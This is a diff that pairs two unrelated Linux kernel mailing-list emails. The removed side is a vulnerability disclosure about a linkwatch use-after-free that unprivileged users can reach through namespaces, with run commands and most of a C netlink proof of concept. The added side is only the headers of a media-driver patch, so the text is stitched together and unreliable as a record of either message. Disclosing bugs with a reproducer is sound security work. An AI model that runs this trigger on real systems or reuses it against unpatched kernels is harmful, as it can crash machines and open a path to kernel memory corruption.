@@ -1,865 +1,160 @@
-Received: from mail-pl1-f170.google.com (mail-pl1-f170.google.com [209.85.214.170])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from PUWP216CU001.outbound.protection.outlook.com (mail-koreasouthazon11020140.outbound.protection.outlook.com [52.101.156.140])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 732963C8C7C
-	for <linux-kernel@vger.kernel.org>; Fri,  4 Sep 2026 06:46:52 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.170
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788504414; cv=none; b=cYIG/0PbsTUWrj+L6h2WIol30B+q/I9we8e/edoO2zIUfRX5zmdhOOBmMo1L7U9op3Jzahnjnjikac9nw5/M/Rx2r3jS8k6Ff3uK1H0a/XlkOnDdZBZOMqViU67CHtA96CasAjN7HKU4ZUekh/s/4h4eHTDZxWysI9La/PGnf+E=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788504414; c=relaxed/simple;
-	bh=7MTYeC9J490UOcZQW+pdofGNFR6+tNvG8PhJ+LaYB54=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Fq0l5dd1+oCcdUfdavzTBog63qcd6W3CWuabFBTAqgvjnTtcAEUy8G9Md5PYyhrpBjDvAXqmucuTcM00DFOhEB+46fCIzo/uvZrgAleZCfHHkRHaSyV180d7rJzQuqjW/S13UrJj5CZqp719w+DrtozSrY1GWH/VSutCalQN8no=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IHuivHEU; arc=none smtp.client-ip=209.85.214.170
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7C273415F06;
+	Fri,  4 Sep 2026 06:46:54 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.156.140
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1788504417; cv=fail; b=f8kIyYhudJ1MYGuVf6QAFGR/1LnDtgJL7iOCLTsnFYlcknwTXbjiS3aHUH6RSs/ISBBI20VBATDBuQq1Xax6L3AiIfB3zwvZBplJ/IZxFRoNe20UTNR1NpYgRCzobnhvu2ON6xgqYql1O/mm5svxIITs36rZHXAMnXNDNRThL6M=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1788504417; c=relaxed/simple;
+	bh=sgzpOEe5gLl43St+aDlf6mQut1QcHlE/vtRcI4XXiaI=;
+	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
+	 Content-Type:MIME-Version; b=cE14k7BfovbXHgqlpCgSNPJ9pLrwyBWfAEWLlrpdkzELrVurCtb8kiDr14DR8n0M/FIquZlafqXXcEJu+4DyKNCe2FgWCNDjvvhWdjnqQ0x7IqPM8bXHWWm42mc5r2noHF62L0p82robxY+Taf2oK5Ph1ByN9Jdnom5/LzMiclo=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=chipsnmedia.com; spf=fail smtp.mailfrom=chipsnmedia.com; dkim=pass (2048-bit key) header.d=chipsnmedia.com header.i=@chipsnmedia.com header.b=FWrArsMu; arc=fail smtp.client-ip=52.101.156.140
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=chipsnmedia.com
+Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=chipsnmedia.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IHuivHEU"
-Received: by mail-pl1-f170.google.com with SMTP id d9443c01a7336-2cc891373e0so6734415ad.2
-        for <linux-kernel@vger.kernel.org>; Thu, 03 Sep 2026 23:46:52 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1788504412; x=1789109212; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=EtyqbfkvfdD0c77TcAxaGpDz3K7Bjw+7XCGU3LBcQt8=;
-        b=IHuivHEUGiwPLbBF1wZF+HcnKMeE8wOVjSuZiwP8wf/tTuAJsItA3CGhGo/wot665S
-         PIxTDSCBHnPD2N5NdUTXVZYQBum7xNKZ1mM75U+WiaFg0VGMVEhcHNlrajuWhJY2bhyr
-         KslBQ1PvL5Ng6PjJGrR6+683TMBJEDRjonyUGGM228FmRRAEt7wk12+dmQu0/lf7MIqT
-         TYm+fwabuSkuomyOfsq+jsyCJwYHDZsoZhSNT+XTeBT0dIDy53uGNVfcVkv4JcfJdKlw
-         ym3otewLiMQL26oiPpL6oaqFQf/geT143M/mH49OacaJhcwx0qkwzJ9xw7SXRZgSlhvc
-         HD1A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1788504412; x=1789109212;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=EtyqbfkvfdD0c77TcAxaGpDz3K7Bjw+7XCGU3LBcQt8=;
-        b=EPPUpDm9mfyE/dwUsmT9mmTaAOYclQYSaZBuz07MlWFn0AiltbDyvfUGvjQ3IT6OMN
-         pTk70FWfwH/r5AHcKr7+Ha2W06pQSZVWinWFM6XoE1zeyY2O1G4GwL/2T1bw0lL+UovU
-         8zOF5dXG6yyrKD7vZVtf/dnN7AiYAHt6QApK88segTm19pGAuSOHPC4xBXca2CTh8PMt
-         NlixSj1hjtWAAHdy2H1pQsX61+AI/Z7ZttPCKHmSQR/jIdbzlLdSHqttlxfDhZvQMJ9c
-         fZlHzu5NOH7mgJjNeudp1Q0ylsi9f2GdP+5SkbrBWsW5eox9LxJO08Ofwf6XC0svpJpA
-         Z2jA==
-X-Forwarded-Encrypted: i=1; AKwUvBz9Z4IPG7zDlAuZHF2pjc+/xRVcNdKvqITj/dOZgrxIuZwAguQ7zUgDpzMXSNLurD1RZzuX7Vn9Dp+bC2o=@vger.kernel.org
-X-Gm-Message-State: AFuF++kDZP/ECmhC5Z3t0MUdUOGYiOehEr969BFVEAf9P1Obu+5ms0OL
-	hxRfDGMVDmxU26dJ0dG3dk/VobMrqzbKrRkGI2+a5Qzl+as7g1hc29JI9lLsjOt8C5cI
-X-Gm-Gg: AYBFou3yLu7Nkl4yu2RMKvoFueSNtC/sXdDJgUOlS/g2Nbv7kxCCNV0dWXKR+5tAJiB
-	dgwjc4tXWwv9YSVOMVY7MNL7bNwGt5GAxSCV/of9fnt2SydgKQM+wFPOhrp0C9s47qylF4KcoIm
-	RHvZpYfkokrAluMi997ZNDTqvCXbYvuizuES7YT3nOo5y+94MOP+PDnfqlUkbrPN2Kouf+9UuYr
-	s3K0xRwKhp+KHqeX0n81DaYNoCE3bxUgkBB2JvQdTV5UBimMWn2Bc1V2cz0OpCdyGvAb7nAYoWH
-	wQu5maehlqLT0El0uAywiIEfZTMe0uGUqzgZ2j+szprgXsEu0Tx3t5LTGt8MCo+nfEEEuRIk3+Q
-	TFjKKzt18iqAYJ3ZnTjiBASD0MZhG/+aqHZfQQziAObpI7IV3lfyaEbiy1GZVxKjMOH9VR2buL5
-	v2tpNon+8uqR34H7C1+O+Z4d8Pz6Nsi+8BmxSexB4MyYn2xH6ZlAy9VkSsvGpo4KKZKJvPdXIxl
-	dDOzYt5FNZeBWuOnnPIRzLNmegZTA==
-X-Received: by 2002:a17:90b:2542:b0:398:9beb:5c17 with SMTP id 98e67ed59e1d1-39b2620a2bfmr5423495a91.18.1788504411295;
-        Thu, 03 Sep 2026 23:46:51 -0700 (PDT)
-Received: from b6ad5085b32f.. ([122.51.212.64])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39b25c974cfsm2950848a91.0.2026.09.03.23.46.48
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 03 Sep 2026 23:46:50 -0700 (PDT)
-From: Zihan Xi <zihanx@nebusec.ai>
-To: netdev@vger.kernel.org
-Cc: "David S . Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH net 0/1] net: fix linkwatch UAF on uninitialized netdev
-Date: Fri,  4 Sep 2026 06:46:43 +0000
-Message-ID: <cover.1788500348.git.zihanx@nebusec.ai>
-X-Mailer: git-send-email 2.47.3
+	dkim=pass (2048-bit key) header.d=chipsnmedia.com header.i=@chipsnmedia.com header.b="FWrArsMu"
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=b2Api5wHX+pL8kNYhGOKhfzLb4R91R6qD8F8MywbzmB589EgxkkVNFwgmc5D62Xxqy7QbG/Z+xEEsh6gCSDCdeN7bgT20FYii/PY4q6TBEnERi2G12X5twUOLpEsBjeF0Ujge+2hDPqcUYb6CVRQ477JS8iJk+oNyI3rlQkZ1Nh52q8frRgSJHhFyM47eX5ASwzqlNZli8u7yGZi/L9NVgIMvqC6ZtOGFChDW5PHYNb5Lep9jxKsvcUR3/OZo4O2UXZeccp4p+1UCcevizousOaW/P2WK+4lMY3vklBAnmfvTqUeypCaL+QlWMt30w6cq0VnA27/X+kkuzLWFw1xgQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=eAC8+/v7e6XibFsNPx+Wyt11P3I9nhDS/a803tt9xOg=;
+ b=zQ1WFHjto2I4vjE5wqk0dwqRbircfkwvntEVegrTV+eLEKjGeL6FkGTFXxL6S/hT65d4iriot50i/i+bUNxNAiED48F7XPJcDMvFsyL1xGDSgB14T1O3yNd3a9Ebl4P7ck2l5AxxmlEZH1JR/JmjzeSCJZH/wYwp2mgJUuUR3vS2nhmAhtmf0L41Gt2Hb+9jWreoW1uP/1Qx56KaypJHwnoXanBb19/WDQ3wxEifBCiT9yR8WtlJaQTpLjaDKCh25aDzhtmQDquXs6BH6HMjdZYzbRJEI5dchu5Xh11Fs5zwRBlYd6Ujtvep/4StxR+LVwkdR5qgSchdqaVBb3U8kQ==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=chipsnmedia.com; dmarc=pass action=none
+ header.from=chipsnmedia.com; dkim=pass header.d=chipsnmedia.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=chipsnmedia.com;
+ s=selector2;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=eAC8+/v7e6XibFsNPx+Wyt11P3I9nhDS/a803tt9xOg=;
+ b=FWrArsMuBj0oODWqNSgoboIZcCrsxyc0osiThkKX1ITQ9eaWzmW7WNK8oP2znbUxq49KLF9DMnePEF4UYMihYAHGErdc7kTw78CEfbpHiABFB8hxr4Vh9Owtexx31PMXrFcWB0HJDbmH4Imi4qaxbtKbnTPkar/lUxjs1duVJlPtu0yS/tsvNYl9crUE9fRIpRSgINBWGkXSzQry+HUKzA+B9zUMoNWBWcYdZM9YXamR8rTW2jJmnrLJgQfN1GDLnvCY623oiQuEFaGgC2x7orF9HGTa7ylpC7ZtIZky3vEyZ3Q+l6xfCUChYiYhZxJfZgz8OwZpYUb3ejpyWQpJ2Q==
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=chipsnmedia.com;
+Received: from SL2P216MB2441.KORP216.PROD.OUTLOOK.COM (2603:1096:101:1b9::8)
+ by SEWP216MB2979.KORP216.PROD.OUTLOOK.COM (2603:1096:101:296::10) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.360.13; Fri, 4 Sep
+ 2026 06:46:51 +0000
+Received: from SL2P216MB2441.KORP216.PROD.OUTLOOK.COM
+ ([fe80::f234:3bc6:9197:8232]) by SL2P216MB2441.KORP216.PROD.OUTLOOK.COM
+ ([fe80::f234:3bc6:9197:8232%6]) with mapi id 15.21.0360.008; Fri, 4 Sep 2026
+ 06:46:51 +0000
+From: Nas Chung <nas.chung@chipsnmedia.com>
+To: mchehab@kernel.org,
+	hverkuil@xs4all.nl,
+	robh@kernel.org,
+	krzk+dt@kernel.org,
+	conor+dt@kernel.org,
+	shawnguo@kernel.org,
+	s.hauer@pengutronix.de
+Cc: linux-media@vger.kernel.org,
+	devicetree@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	linux-imx@nxp.com,
+	linux-arm-kernel@lists.infradead.org,
+	jackson.lee@chipsnmedia.com,
+	lafley.kim@chipsnmedia.com,
+	marek.vasut@mailbox.org,
+	Nas Chung <nas.chung@chipsnmedia.com>
+Subject: [PATCH v7 1/9] media: v4l2-common: Fix P010 format info
+Date: Fri,  4 Sep 2026 15:46:27 +0900
+Message-Id: <a6496e8b6bf87c48f4ab5ae31aa952eeebb7a2e3.1788496816.git.nas.chung@chipsnmedia.com>
+X-Mailer: git-send-email 2.25.1
+In-Reply-To: <cover.1788496816.git.nas.chung@chipsnmedia.com>
+References: <cover.1788496816.git.nas.chung@chipsnmedia.com>
+Content-Transfer-Encoding: 8bit
+Content-Type: text/plain
+X-ClientProxiedBy: SEWP216CA0130.KORP216.PROD.OUTLOOK.COM
+ (2603:1096:101:2c0::8) To SL2P216MB2441.KORP216.PROD.OUTLOOK.COM
+ (2603:1096:101:1b9::8)
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-
-Hi Linux kernel maintainers,
-
-We found and validated an issue in net/core/link_watch.c. The bug is reachable by a
-non-root user via user and net namespace.
-We've tested it, and it should not affect any other functionality.
-
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-linkwatch_fire_event() queues a net_device onto lweventlist and takes a
-netdev_hold() without checking whether the device has ever been
-registered. free_netdev() immediately kvfree()s NETREG_UNINITIALIZED
-devices and does not drain that queue. The later linkwatch worker can
-therefore dereference a freed list entry.
-
-netif_carrier_on(), netif_carrier_off() and netif_carrier_event() already
-skip NETREG_UNINITIALIZED. The remaining helpers do not:
-netif_dormant_on/off() and netif_testing_on/off() call
-linkwatch_fire_event() as soon as the corresponding bit changes.
-Pre-registration operstate bits are supposed to stay local and be
-consumed later by linkwatch_init_dev() inside register_netdevice().
-
-The current reproducer uses virt_wifi because virt_wifi_newlink() calls
-netif_stacked_transfer_operstate() before register_netdevice(). A lower
-dummy device in IF_OPER_DORMANT makes netif_dormant_on() queue the
-never-registered upper device. An invalid ifname such as "bad/name" then
-fails in dev_get_valid_name(), after which rtnl_newlink_create() calls
-free_netdev() immediately. Duplicate names or ifindex values are not
-useful here: rtnetlink rejects them before virt_wifi_newlink() runs.
-
-This is not a virt_wifi-only bug. Any caller of netif_dormant_*(),
-netif_testing_*(), or linkwatch_fire_event() on a NETREG_UNINITIALIZED
-device can hit the same helper. Other stacked drivers such as macvlan,
-ipvlan, vlan, macsec and qmi_wwan transfer operstate after registration.
-
-The underlying hole is old. linkwatch_fire_event() has never rejected
-NETREG_UNINITIALIZED devices. That goes back to
-commit 1da177e4c3f4 ("Linux-2.6.12-rc2"), the root of this tree.
-The Fixes: tag therefore points at
-commit 1da177e4c3f4 ("Linux-2.6.12-rc2").
-
-commit b00055aacdb1 ("[NET] core: add RFC2863 operstate")
-only added extra dormant callers.
-
-commit b47300168e77 ("net: Do not fire linkwatch events
-until the device is registered.")
-later closed the analogous carrier path only.
-
-commit 22604c866889 ("net: Fix for initial link state in 2.6.28")
-briefly added a NETREG_UNINITIALIZED return in the helper after
-calling rfc2863_policy().
-
-commit c276e098d3ee ("Revert "net: Fix for initial link state in 2.6.28"")
-removed that helper check again.
-
-commit eec517cdb481 ("net: Add IF_OPER_TESTING")
-later added netif_testing_*() with the same missing check. virt_wifi
-only makes the old hole easy to hit from rtnetlink.
-
-The local crash capture used kernel.panic_on_warn=0. With the default
-panic_on_warn=1, the same path usually panics earlier in free_netdev() /
-ref_tracker_dir_exit() because the stale linkwatch netdev_hold() is
-still outstanding.
-
-This is an rtnetlink RTM_NEWLINK creation path, not a packet-sequence
-or protocol-state trigger. packetdrill cannot express creating a dummy
-lower device, setting IFLA_OPERSTATE, and issuing a failing
-RTM_NEWLINK(kind="virt_wifi") request, so the PoC uses Netlink sockets.
-
-The bug is reachable by an unprivileged user via user and net
-namespaces. On the unpatched 7.2.0-g2f38e26a5741 kernel, uid=1002
-plus unshare of CLONE_NEWUSER|CLONE_NEWNET is enough, because the
-path only needs netns-local CAP_NET_ADMIN. Repeating the failing
-virt_wifi RTM_NEWLINK queues a NETREG_UNINITIALIZED kmalloc-4k
-net_device onto lweventlist, after which free_netdev() frees it.
-The later linkwatch path can then touch that freed list entry.
-
-The attached crash log is a KASAN slab-use-after-free captured on
-net.git 2f38e26a5741 (7.2.0-g2f38e26a5741) in QEMU.
-./scripts/decode_stacktrace.sh was applied to that log. An earlier
-6.12.95 capture showed the later worker GPF on the same freed list
-entry; this capture reports the UAF when a later
-linkwatch_fire_event() list_add() touches a device already freed by
-rtnl_newlink().
-
-On this QEMU guest, querying the dummy ifindex with RTM_GETLINK
-blocked in recv, so the attached reproducer uses SIOCGIFINDEX
-instead. The rest of the trigger is unchanged.
-
-Reproducer:
-
-    gcc -O2 -static -o poc poc.c
-    unshare -Urn ./poc
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-#define _GNU_SOURCE
-
-#include <errno.h>
-#include <linux/if.h>
-#include <linux/if_link.h>
-#include <linux/netlink.h>
-#include <linux/rtnetlink.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <time.h>
-#include <unistd.h>
-#include <sys/ioctl.h>
-
-#ifndef IFLA_INFO_KIND
-#define IFLA_INFO_KIND 1
-#endif
-
-static int addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
-		     const void *data, size_t alen)
-{
-	size_t len = RTA_LENGTH(alen);
-	size_t newlen = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
-	struct rtattr *rta;
-
-	if (newlen > maxlen) {
-		errno = EOVERFLOW;
-		return -1;
-	}
-
-	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
-	rta->rta_type = type;
-	rta->rta_len = len;
-	if (alen)
-		memcpy(RTA_DATA(rta), data, alen);
-	n->nlmsg_len = newlen;
-	return 0;
-}
-
-static int addattr8(struct nlmsghdr *n, size_t maxlen, int type, uint8_t data)
-{
-	return addattr_l(n, maxlen, type, &data, sizeof(data));
-}
-
-static int addattr32(struct nlmsghdr *n, size_t maxlen, int type, uint32_t data)
-{
-	return addattr_l(n, maxlen, type, &data, sizeof(data));
-}
-
-static int addattrstrz(struct nlmsghdr *n, size_t maxlen, int type,
-		       const char *str)
-{
-	return addattr_l(n, maxlen, type, str, strlen(str) + 1);
-}
-
-static struct rtattr *addattr_nest(struct nlmsghdr *n, size_t maxlen, int type)
-{
-	struct rtattr *nest;
-
-	nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
-	if (addattr_l(n, maxlen, type, NULL, 0) < 0)
-		return NULL;
-	return nest;
-}
-
-static void addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
-{
-	nest->rta_len = (char *)n + n->nlmsg_len - (char *)nest;
-}
-
-static int nl_talk(int fd, struct nlmsghdr *nlh)
-{
-	struct sockaddr_nl nladdr = {
-		.nl_family = AF_NETLINK,
-	};
-	struct iovec iov = {
-		.iov_base = nlh,
-		.iov_len = nlh->nlmsg_len,
-	};
-	struct msghdr msg = {
-		.msg_name = &nladdr,
-		.msg_namelen = sizeof(nladdr),
-		.msg_iov = &iov,
-		.msg_iovlen = 1,
-	};
-	char buf[8192];
-	ssize_t len;
-
-	if (sendmsg(fd, &msg, 0) < 0)
-		return -1;
-
-	for (;;) {
-		struct nlmsghdr *h;
-
-		len = recv(fd, buf, sizeof(buf), 0);
-		if (len < 0) {
-			if (errno == EINTR)
-				continue;
-			return -1;
-		}
-
-		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, (unsigned int)len);
-		     h = NLMSG_NEXT(h, len)) {
-			if (h->nlmsg_seq != nlh->nlmsg_seq)
-				continue;
-			if (h->nlmsg_type == NLMSG_ERROR) {
-				struct nlmsgerr *err = NLMSG_DATA(h);
-
-				if (h->nlmsg_len < NLMSG_LENGTH(sizeof(*err))) {
-					errno = EPROTO;
-					return -1;
-				}
-				if (err->error == 0)
-					return 0;
-				errno = -err->error;
-				return -1;
-			}
-		}
-	}
-}
-
-static int open_rtnl(void)
-{
-	struct sockaddr_nl local = {
-		.nl_family = AF_NETLINK,
-	};
-	int fd;
-
-	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
-	if (fd < 0)
-		return -1;
-	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
-		close(fd);
-		return -1;
-	}
-	return fd;
-}
-
-static uint32_t next_seq(void)
-{
-	struct timespec ts;
-
-	clock_gettime(CLOCK_MONOTONIC, &ts);
-	return (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ getpid());
-}
-
-static int create_dummy(int fd, const char *ifname)
-{
-	struct {
-		struct nlmsghdr nlh;
-		struct ifinfomsg ifi;
-		char buf[512];
-	} req = {
-		.nlh = {
-			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
-			.nlmsg_type = RTM_NEWLINK,
-			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
-				       NLM_F_CREATE | NLM_F_EXCL,
-			.nlmsg_seq = next_seq(),
-		},
-		.ifi = {
-			.ifi_family = AF_UNSPEC,
-		},
-	};
-	struct rtattr *linkinfo;
-
-	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, ifname) < 0)
-		return -1;
-
-	linkinfo = addattr_nest(&req.nlh, sizeof(req), IFLA_LINKINFO);
-	if (!linkinfo)
-		return -1;
-
-	if (addattrstrz(&req.nlh, sizeof(req), IFLA_INFO_KIND, "dummy") < 0)
-		return -1;
-	addattr_nest_end(&req.nlh, linkinfo);
-
-	return nl_talk(fd, &req.nlh);
-}
-
-static int set_link_up(int fd, int ifindex)
-{
-	struct {
-		struct nlmsghdr nlh;
-		struct ifinfomsg ifi;
-		char buf[128];
-	} req = {
-		.nlh = {
-			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
-			.nlmsg_type = RTM_SETLINK,
-			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
-			.nlmsg_seq = next_seq(),
-		},
-		.ifi = {
-			.ifi_family = AF_UNSPEC,
-			.ifi_index = ifindex,
-			.ifi_change = IFF_UP,
-			.ifi_flags = IFF_UP,
-		},
-	};
-
-	return nl_talk(fd, &req.nlh);
-}
-
-static int set_operstate(int fd, int ifindex, uint8_t operstate)
-{
-	struct {
-		struct nlmsghdr nlh;
-		struct ifinfomsg ifi;
-		char buf[128];
-	} req = {
-		.nlh = {
-			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
-			.nlmsg_type = RTM_SETLINK,
-			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
-			.nlmsg_seq = next_seq(),
-		},
-		.ifi = {
-			.ifi_family = AF_UNSPEC,
-			.ifi_index = ifindex,
-		},
-	};
-
-	if (addattr8(&req.nlh, sizeof(req), IFLA_OPERSTATE, operstate) < 0)
-		return -1;
-
-	return nl_talk(fd, &req.nlh);
-}
-
-static int trigger_virt_wifi_uaf(int fd, int lower_ifindex)
-{
-	const char *bad_name = "bad/name";
-	struct {
-		struct nlmsghdr nlh;
-		struct ifinfomsg ifi;
-		char buf[512];
-	} req = {
-		.nlh = {
-			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
-			.nlmsg_type = RTM_NEWLINK,
-			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
-				       NLM_F_CREATE | NLM_F_EXCL,
-			.nlmsg_seq = next_seq(),
-		},
-		.ifi = {
-			.ifi_family = AF_UNSPEC,
-		},
-	};
-	struct rtattr *linkinfo;
-
-	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, bad_name) < 0)
-		return -1;
-	if (addattr32(&req.nlh, sizeof(req), IFLA_LINK, lower_ifindex) < 0)
-		return -1;
-
-	linkinfo = addattr_nest(&req.nlh, sizeof(req), IFLA_LINKINFO);
-	if (!linkinfo)
-		return -1;
-	if (addattrstrz(&req.nlh, sizeof(req), IFLA_INFO_KIND, "virt_wifi") < 0)
-		return -1;
-	addattr_nest_end(&req.nlh, linkinfo);
-
-	return nl_talk(fd, &req.nlh);
-}
-
-static int query_link(int fd, const char *ifname, int *ifindex, uint8_t *operstate)
-{
-	struct {
-		struct nlmsghdr nlh;
-		struct ifinfomsg ifi;
-		char buf[256];
-	} req = {
-		.nlh = {
-			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
-			.nlmsg_type = RTM_GETLINK,
-			.nlmsg_flags = NLM_F_REQUEST,
-			.nlmsg_seq = next_seq(),
-		},
-		.ifi = {
-			.ifi_family = AF_UNSPEC,
-		},
-	};
-	struct sockaddr_nl nladdr = {
-		.nl_family = AF_NETLINK,
-	};
-	struct iovec iov = {
-		.iov_base = &req,
-		.iov_len = req.nlh.nlmsg_len,
-	};
-	struct msghdr msg = {
-		.msg_name = &nladdr,
-		.msg_namelen = sizeof(nladdr),
-		.msg_iov = &iov,
-		.msg_iovlen = 1,
-	};
-	char buf[4096];
-	ssize_t len;
-
-	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, ifname) < 0)
-		return -1;
-
-	if (sendmsg(fd, &msg, 0) < 0)
-		return -1;
-
-	for (;;) {
-		struct nlmsghdr *h;
-
-		len = recv(fd, buf, sizeof(buf), 0);
-		if (len < 0) {
-			if (errno == EINTR)
-				continue;
-			return -1;
-		}
-
-		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, (unsigned int)len);
-		     h = NLMSG_NEXT(h, len)) {
-			struct ifinfomsg *ifi;
-			struct rtattr *rta;
-			int attrlen;
-
-			if (h->nlmsg_seq != req.nlh.nlmsg_seq)
-				continue;
-			if (h->nlmsg_type == NLMSG_ERROR) {
-				struct nlmsgerr *err = NLMSG_DATA(h);
-
-				if (err->error == 0) {
-					errno = ENOENT;
-					return -1;
-				}
-				errno = -err->error;
-				return -1;
-			}
-			if (h->nlmsg_type != RTM_NEWLINK)
-				continue;
-
-			ifi = NLMSG_DATA(h);
-			if (ifindex)
-				*ifindex = ifi->ifi_index;
-			if (operstate)
-				*operstate = IF_OPER_UNKNOWN;
-
-			attrlen = h->nlmsg_len - NLMSG_LENGTH(sizeof(*ifi));
-			for (rta = IFLA_RTA(ifi); RTA_OK(rta, attrlen);
-			     rta = RTA_NEXT(rta, attrlen)) {
-				if (operstate && rta->rta_type == IFLA_OPERSTATE &&
-				    RTA_PAYLOAD(rta) >= sizeof(uint8_t))
-					*operstate = *(uint8_t *)RTA_DATA(rta);
-			}
-			return 0;
-		}
-	}
-}
-
-static const char *operstate_name(uint8_t operstate)
-{
-	switch (operstate) {
-	case IF_OPER_NOTPRESENT:
-		return "notpresent";
-	case IF_OPER_DOWN:
-		return "down";
-	case IF_OPER_LOWERLAYERDOWN:
-		return "lowerlayerdown";
-	case IF_OPER_TESTING:
-		return "testing";
-	case IF_OPER_DORMANT:
-		return "dormant";
-	case IF_OPER_UP:
-		return "up";
-	case IF_OPER_UNKNOWN:
-	default:
-		return "unknown";
-	}
-}
-
-
-static int ifname_to_index(const char *ifname)
-{
-	struct ifreq ifr;
-	int s, ifindex;
-
-	s = socket(AF_INET, SOCK_DGRAM, 0);
-	if (s < 0)
-		return -1;
-	memset(&ifr, 0, sizeof(ifr));
-	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
-	if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
-		close(s);
-		return -1;
-	}
-	ifindex = ifr.ifr_ifindex;
-	close(s);
-	return ifindex;
-}
-
